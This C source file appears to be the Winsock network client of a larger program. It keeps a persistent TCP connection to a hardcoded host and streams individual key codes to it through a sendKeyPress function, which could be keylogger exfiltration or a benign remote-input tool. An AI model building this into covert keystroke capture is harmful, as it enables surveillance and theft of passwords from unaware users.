#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include "Globals.h"
#include "NetworkClient.h"

#pragma comment(lib, "Ws2_32.lib")

SOCKET g_persistentSocket = INVALID_SOCKET; // Global persistent socket

// Initialize Winsock
bool initializeWinsock() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        if (DEBUG) printf("Failed to initialize Winsock.\n");
        return false;
    }
    return true;
}

// Establish a persistent connection
bool establishConnection() {
    if (g_persistentSocket != INVALID_SOCKET) return true; // Connection is already established

    g_persistentSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (g_persistentSocket == INVALID_SOCKET) {
        if (DEBUG) printf("Socket creation failed.\n");
        return false;
    }

    sockaddr_in serverAddress;
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(8028);
    inet_pton(AF_INET, "192.168.7.225", &serverAddress.sin_addr);

    if (connect(g_persistentSocket, (SOCKADDR*)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
        if (DEBUG) printf("Failed to connect to server.\n");
        closesocket(g_persistentSocket);
        g_persistentSocket = INVALID_SOCKET;
        return false;
    }

    return true;
}

// Close the persistent connection
void closeConnection() {
    if (g_persistentSocket != INVALID_SOCKET) {
        closesocket(g_persistentSocket);
        g_persistentSocket = INVALID_SOCKET;
    }
}

void sendKeyPress(UINT keyCode) {
    if (g_persistentSocket == INVALID_SOCKET) {
        if (!establishConnection()) {
            if (DEBUG) printf("Reconnection failed.\n");
            return;
        }
    }

    // Convert the numerical value of the key code to a string
    char buffer[16]; // Assuming the key code can be represented in less than 16 characters
    int len = snprintf(buffer, sizeof(buffer), "%u", keyCode);

    // Send the key code over the network
    if (len > 0 && send(g_persistentSocket, buffer, len, 0) == SOCKET_ERROR) {
        if (DEBUG) printf("Failed to send data.\n");
    }
}

// Cleanup Winsock
void cleanupWinsock() {
    WSACleanup();
}